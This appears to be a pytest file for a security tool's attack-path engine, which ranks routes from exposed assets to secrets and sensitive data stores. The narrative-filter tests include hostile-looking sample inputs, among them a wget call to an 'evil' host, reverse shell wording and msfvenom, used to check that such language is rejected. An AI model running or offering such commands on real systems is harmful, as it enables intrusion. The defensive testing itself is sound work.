"""Attack-path engine tests.

The core computation (`AttackPathEngine.compute_paths`) is pure: it takes
an in-memory graph dict, so most of the algorithm is covered without any
database. A handful of DB-backed tests exercise bulk loading, upsert,
stale pruning and source/target classification against seeded data; they
skip cleanly when no TEST_DATABASE_URL / DATABASE_URL is reachable.
"""
from __future__ import annotations

import pytest

from app.engine.attackpath import (
    AttackPathEngine,
    classify_source,
    classify_target,
    contains_unsafe_token,
    entry_cost,
    exploitability_score,
    max_severity,
    node_entry_bonus,
    path_fingerprint,
    safe_narrative,
)

from .conftest import mk_asset, mk_edge, mk_finding


# ----------------------------------------------------------------------------
# In-memory graph builder (no DB)
# ----------------------------------------------------------------------------

def _graph(
    nodes: dict[str, dict],
    edges: list[tuple[str, str, str]],
    findings: dict[str, list[dict]] | None = None,
    public_nets: tuple = (),
) -> dict:
    assets = {
        nid: {
            "id": nid,
            "kind": spec["kind"],
            "value": spec.get("value", nid),
            "metadata": spec.get("metadata", {}),
        }
        for nid, spec in nodes.items()
    }
    adj: dict[str, set[str]] = {nid: set() for nid in assets}
    edge_kind: dict[tuple[str, str], str] = {}
    for s, d, k in edges:
        adj[s].add(d)
        adj[d].add(s)
        key = (s, d) if s < d else (d, s)
        cur = edge_kind.get(key)
        if cur is None or k < cur:
            edge_kind[key] = k
    return {
        "assets": assets,
        "adj": {k: sorted(v) for k, v in adj.items()},
        "edge_kind": edge_kind,
        "findings_by_asset": findings or {},
        "public_nets": public_nets,
    }


def _finding(fid, severity="high", rule_source="nuclei", kev=False):
    md = {"kev": True} if kev else {}
    return {"id": fid, "severity": severity, "rule_source": rule_source, "metadata": md}


# ----------------------------------------------------------------------------
# Pure: node costing
# ----------------------------------------------------------------------------

def test_source_entry_cost_is_zero():
    assert entry_cost([_finding("f", "critical", kev=True)], is_source=True) == 0


def test_entry_cost_base_with_no_findings():
    assert entry_cost([]) == 10


def test_entry_cost_high_finding():
    # high -> bonus 4 -> 10 - 4 = 6
    assert entry_cost([_finding("f", "high")]) == 6


def test_entry_cost_kev_beats_critical():
    assert node_entry_bonus([_finding("f", "critical", kev=True)]) == 8
    assert entry_cost([_finding("f", "critical", kev=True)]) == 2


def test_entry_cost_bonus_capped_and_floor_one():
    # kev(8) + exposed_file(5) = 13, capped at 9 -> cost floor 1
    findings = [_finding("f", "high", rule_source="exposed_file", kev=True)]
    assert node_entry_bonus(findings) == 9
    assert entry_cost(findings) == 1


def test_exposed_file_bonus_stacks_on_severity():
    # high(4) + exposed_file(5) = 9 -> cost 1
    assert node_entry_bonus([_finding("f", "high", rule_source="exposed_file")]) == 9


def test_exploitability_formula():
    # total_cost 16 over length 2 -> 100*(1 - 16/20) = 20.0
    assert exploitability_score(16, 2) == 20.0
    # cheap single hop -> high score
    assert exploitability_score(2, 1) == 80.0
    # clamped at 0
    assert exploitability_score(100, 2) == 0.0


def test_max_severity_picks_highest():
    assert max_severity([_finding("a", "low"), _finding("b", "critical")]) == "critical"
    assert max_severity([]) is None


# ----------------------------------------------------------------------------
# Pure: classification
# ----------------------------------------------------------------------------

def test_classify_source_endpoint():
    ok, reason = classify_source({"kind": "endpoint", "value": "https://x/", "metadata": {}})
    assert ok and reason == "endpoint"


def test_classify_source_public_metadata():
    ok, reason = classify_source({"kind": "service", "value": "n", "metadata": {"public": True}})
    assert ok and reason == "public_metadata"


def test_classify_source_public_port():
    import ipaddress

    nets = (ipaddress.ip_network("203.0.113.0/24"),)
    asset = {"kind": "port", "value": "443", "metadata": {}}
    ok, reason = classify_source(asset, parent_ip="203.0.113.5", public_nets=nets)
    assert ok and reason == "public_port"
    # same port but private parent IP (not in a public scope CIDR) -> not a source
    ok2, _ = classify_source(asset, parent_ip="10.0.0.5", public_nets=nets)
    assert ok2 is False


def test_classify_source_negative():
    ok, _ = classify_source({"kind": "service", "value": "n", "metadata": {}})
    assert ok is False


def test_classify_target_secret_candidate():
    ok, reason = classify_target({"kind": "secret_candidate", "value": "k", "metadata": {}})
    assert ok and reason == "secret_candidate"


def test_classify_target_sensitive_and_crown_jewel():
    ok, reason = classify_target({"kind": "service", "value": "db", "metadata": {"sensitive": True}})
    assert ok and reason == "sensitive"
    ok2, _ = classify_target({"kind": "service", "value": "db", "metadata": {"crown_jewel": True}})
    assert ok2 is True


def test_classify_target_data_store_technology():
    ok, reason = classify_target({"kind": "technology", "value": "PostgreSQL 14.2", "metadata": {}})
    assert ok and reason == "data_store"
    ok2, _ = classify_target({"kind": "technology", "value": "nginx 1.25", "metadata": {}})
    assert ok2 is False


def test_classify_target_prod_sensitive_endpoint():
    ok, reason = classify_target(
        {"kind": "endpoint", "value": "https://p/", "metadata": {"env": "prod", "sensitive": True}}
    )
    assert ok is True


# ----------------------------------------------------------------------------
# Pure: narrative reject filter
# ----------------------------------------------------------------------------

def test_narrative_reject_filter_tokens():
    assert contains_unsafe_token("run a reverse shell on the host") is True
    assert contains_unsafe_token("drop the payload here") is True
    assert contains_unsafe_token("wget http://evil/x") is True  # via chain regex
    assert contains_unsafe_token("internet-facing endpoint reaches the key store") is False


def test_safe_narrative_falls_back():
    fallback = "neutral route description"
    assert safe_narrative("use msfvenom to", fallback) == fallback
    assert safe_narrative("a clean impact statement", fallback) == "a clean impact statement"


# ----------------------------------------------------------------------------
# Pure: full compute over an in-memory graph
# ----------------------------------------------------------------------------

def test_compute_simple_path_metrics():
    nodes = {
        "s": {"kind": "endpoint", "value": "https://app/"},
        "m": {"kind": "service", "value": "nginx"},
        "t": {"kind": "secret_candidate", "value": "aws_key"},
    }
    edges = [("s", "m", "resolves_to"), ("m", "t", "references")]
    findings = {"m": [_finding("f-high", "high")]}
    eng = AttackPathEngine(db=None)  # compute_paths does not touch the db
    paths = eng.compute_paths(_graph(nodes, edges, findings))

    assert len(paths) == 1
    p = paths[0]
    assert [h["asset_id"] for h in p["hops"]] == ["s", "m", "t"]
    assert p["length"] == 2
    # m: high -> cost 6 ; t: no findings -> cost 10 ; source free
    assert p["total_cost"] == 16
    assert p["exploitability"] == 20.0
    assert p["severity"] == "high"
    assert p["kev_on_path"] is False
    assert p["source_asset_id"] == "s" and p["target_asset_id"] == "t"
    # hop entry costs recorded
    assert p["hops"][0]["entry_cost"] == 0
    assert p["hops"][1]["entry_cost"] == 6
    assert p["hops"][2]["entry_cost"] == 10
    assert p["hops"][1]["edge_kind_in"] == "resolves_to"


def test_compute_kev_on_path_and_severity():
    nodes = {
        "s": {"kind": "endpoint", "value": "https://app/"},
        "t": {"kind": "secret_candidate", "value": "db_pw"},
    }
    edges = [("s", "t", "references")]
    findings = {"t": [_finding("f-kev", "critical", rule_source="cve_match", kev=True)]}
    eng = AttackPathEngine(db=None)
    paths = eng.compute_paths(_graph(nodes, edges, findings))

    p = paths[0]
    assert p["length"] == 1
    # kev -> bonus 8 -> cost 2 ; exploitability 100*(1-2/10)=80
    assert p["total_cost"] == 2
    assert p["exploitability"] == 80.0
    assert p["severity"] == "critical"
    assert p["kev_on_path"] is True


def test_compute_prefers_cheaper_route():
    # Two routes s->t: direct via a heavily-vulnerable (cheap) node vs a
    # longer clean route. Dijkstra keeps the cheapest.
    nodes = {
        "s": {"kind": "endpoint", "value": "https://app/"},
        "cheap": {"kind": "service", "value": "svc-cheap"},
        "clean1": {"kind": "service", "value": "svc-c1"},
        "clean2": {"kind": "service", "value": "svc-c2"},
        "t": {"kind": "secret_candidate", "value": "key"},
    }
    edges = [
        ("s", "cheap", "resolves_to"),
        ("cheap", "t", "references"),
        ("s", "clean1", "resolves_to"),
        ("clean1", "clean2", "runs"),
        ("clean2", "t", "references"),
    ]
    findings = {"cheap": [_finding("f", "high", rule_source="exposed_file", kev=True)]}  # cost 1
    eng = AttackPathEngine(db=None)
    paths = eng.compute_paths(_graph(nodes, edges, findings))
    assert len(paths) == 1
    assert [h["asset_id"] for h in paths[0]["hops"]] == ["s", "cheap", "t"]


def test_compute_respects_hop_cap():
    # Chain of 10 services between source and target -> path length 11 > 8.
    nodes = {"s": {"kind": "endpoint", "value": "https://app/"}}
    edges = []
    prev = "s"
    for i in range(10):
        nid = f"n{i}"
        nodes[nid] = {"kind": "service", "value": f"svc{i}"}
        edges.append((prev, nid, "runs"))
        prev = nid
    nodes["t"] = {"kind": "secret_candidate", "value": "key"}
    edges.append((prev, "t", "references"))
    eng = AttackPathEngine(db=None)
    paths = eng.compute_paths(_graph(nodes, edges))
    assert paths == []  # only route exceeds the 8-hop cap


def test_compute_top_50_cap_and_ordering():
    nodes = {"s": {"kind": "endpoint", "value": "https://app/"}}
    edges = []
    findings = {}
    # 60 direct targets, each with a distinct entry cost -> distinct score.
    for i in range(60):
        tid = f"t{i}"
        nodes[tid] = {"kind": "secret_candidate", "value": f"k{i}"}
        edges.append(("s", tid, "references"))
        # vary cost 1..10 cyclically so exploitability varies
        sev = ["critical", "high", "medium", "low", "info"][i % 5]
        findings[tid] = [_finding(f"f{i}", sev)]
    eng = AttackPathEngine(db=None)
    paths = eng.compute_paths(_graph(nodes, edges, findings))
    assert len(paths) == 50
    scores = [p["exploitability"] for p in paths]
    assert scores == sorted(scores, reverse=True)


def test_compute_is_deterministic():
    nodes = {
        "s": {"kind": "endpoint", "value": "https://app/"},
        "m": {"kind": "service", "value": "svc"},
        "t": {"kind": "secret_candidate", "value": "key"},
    }
    edges = [("s", "m", "resolves_to"), ("m", "t", "references")]
    eng = AttackPathEngine(db=None)
    g1 = _graph(nodes, edges)
    g2 = _graph(nodes, edges)
    p1 = eng.compute_paths(g1)
    p2 = eng.compute_paths(g2)
    assert [p["fingerprint"] for p in p1] == [p["fingerprint"] for p in p2]


def test_compute_no_targets_returns_empty():
    nodes = {
        "s": {"kind": "endpoint", "value": "https://app/"},
        "m": {"kind": "service", "value": "svc"},
    }
    edges = [("s", "m", "resolves_to")]
    eng = AttackPathEngine(db=None)
    assert eng.compute_paths(_graph(nodes, edges)) == []


def test_compute_narrative_sanitized_from_unsafe_value():
    # An asset value that reads like exploitation forces the neutral fallback.
    nodes = {
        "s": {"kind": "endpoint", "value": "https://app/"},
        "t": {"kind": "secret_candidate", "value": "token for /bin/sh dump"},
    }
    edges = [("s", "t", "references")]
    eng = AttackPathEngine(db=None)
    p = eng.compute_paths(_graph(nodes, edges))[0]
    assert "/bin/" not in p["narrative"].lower()
    assert "segment" in p["narrative"].lower()


def test_fingerprint_order_sensitive():
    assert path_fingerprint(["a", "b", "c"]) != path_fingerprint(["a", "c", "b"])
    assert path_fingerprint(["a", "b"]) == path_fingerprint(["a", "b"])


# ----------------------------------------------------------------------------
# DB-backed (skipped without a reachable Postgres)
# ----------------------------------------------------------------------------

pytest_asyncio_db = pytest.mark.asyncio


@pytest.mark.asyncio
async def test_db_path_found_and_persisted(clean_db):
    src = await mk_asset(clean_db, "endpoint", "https://app.example.com/")
    mid = await mk_asset(clean_db, "service", "nginx-ap")
    tgt = await mk_asset(clean_db, "secret_candidate", "aws-key-ap")
    await mk_edge(clean_db, src, mid, "resolves_to")
    await mk_edge(clean_db, mid, tgt, "references")
    await mk_finding(
        clean_db, asset_id=mid, rule_id="cve-ap", rule_source="cve_match",
        severity="critical", metadata={"kev": True},
    )

    eng = AttackPathEngine(clean_db)
    res = await eng.run()
    assert res["computed"] == 1
    assert res["inserted"] == 1

    row = await clean_db.fetchrow(
        "SELECT source_asset_id::text AS s, target_asset_id::text AS t, "
        "length, total_cost, exploitability, severity, kev_on_path, hops "
        "FROM attack_paths"
    )
    assert row["s"] == src and row["t"] == tgt
    assert row["length"] == 2
    # mid: kev -> cost 2 ; tgt: no finding -> cost 10 ; total 12
    assert float(row["total_cost"]) == 12.0
    # 100*(1 - 12/20) = 40
    assert float(row["exploitability"]) == 40.0
    assert row["severity"] == "critical"
    assert row["kev_on_path"] is True
    assert [h["asset_id"] for h in row["hops"]] == [src, mid, tgt]


@pytest.mark.asyncio
async def test_db_idempotent_upsert(clean_db):
    src = await mk_asset(clean_db, "endpoint", "https://app2/")
    tgt = await mk_asset(clean_db, "secret_candidate", "key2")
    await mk_edge(clean_db, src, tgt, "references")

    eng = AttackPathEngine(clean_db)
    r1 = await eng.run()
    r2 = await eng.run()
    assert r1["inserted"] == 1
    # second run upserts the same fingerprint -> nothing newly inserted
    assert r2["inserted"] == 0
    n = await clean_db.fetchval("SELECT COUNT(*) FROM attack_paths")
    assert n == 1


@pytest.mark.asyncio
async def test_db_stale_paths_pruned(clean_db):
    src = await mk_asset(clean_db, "endpoint", "https://app3/")
    t1 = await mk_asset(clean_db, "secret_candidate", "key3a")
    t2 = await mk_asset(clean_db, "secret_candidate", "key3b")
    await mk_edge(clean_db, src, t1, "references")
    await mk_edge(clean_db, src, t2, "references")

    eng = AttackPathEngine(clean_db)
    await eng.run()
    assert await clean_db.fetchval("SELECT COUNT(*) FROM attack_paths") == 2

    # Remove one target's edge so its path disappears from the next run.
    await clean_db.execute(
        "DELETE FROM asset_edges WHERE dst_id = $1::uuid", t2
    )
    await eng.run()
    rows = await clean_db.fetch(
        "SELECT target_asset_id::text AS t FROM attack_paths"
    )
    remaining = {r["t"] for r in rows}
    assert remaining == {t1}


@pytest.mark.asyncio
async def test_db_empty_graph_clears_table(clean_db):
    src = await mk_asset(clean_db, "endpoint", "https://app4/")
    tgt = await mk_asset(clean_db, "secret_candidate", "key4")
    await mk_edge(clean_db, src, tgt, "references")
    eng = AttackPathEngine(clean_db)
    await eng.run()
    assert await clean_db.fetchval("SELECT COUNT(*) FROM attack_paths") == 1

    # Drop the edge entirely -> no paths -> table cleared.
    await clean_db.execute("DELETE FROM asset_edges")
    res = await eng.run()
    assert res["computed"] == 0
    assert await clean_db.fetchval("SELECT COUNT(*) FROM attack_paths") == 0


@pytest.mark.asyncio
async def test_db_loader_classifies_sources_and_targets(clean_db):
    ep = await mk_asset(clean_db, "endpoint", "https://pub-ap/")
    tech = await mk_asset(clean_db, "technology", "MongoDB 6.0")
    secret = await mk_asset(clean_db, "secret_candidate", "leaked-ap")
    plain = await mk_asset(clean_db, "service", "plain-ap")

    eng = AttackPathEngine(clean_db)
    graph = await eng._load_graph()

    srcs = {
        aid for aid, a in graph["assets"].items() if classify_source(a)[0]
    }
    tgts = {
        aid for aid, a in graph["assets"].items() if classify_target(a)[0]
    }
    assert ep in srcs
    assert plain not in srcs
    assert tech in tgts and secret in tgts
    assert plain not in tgts
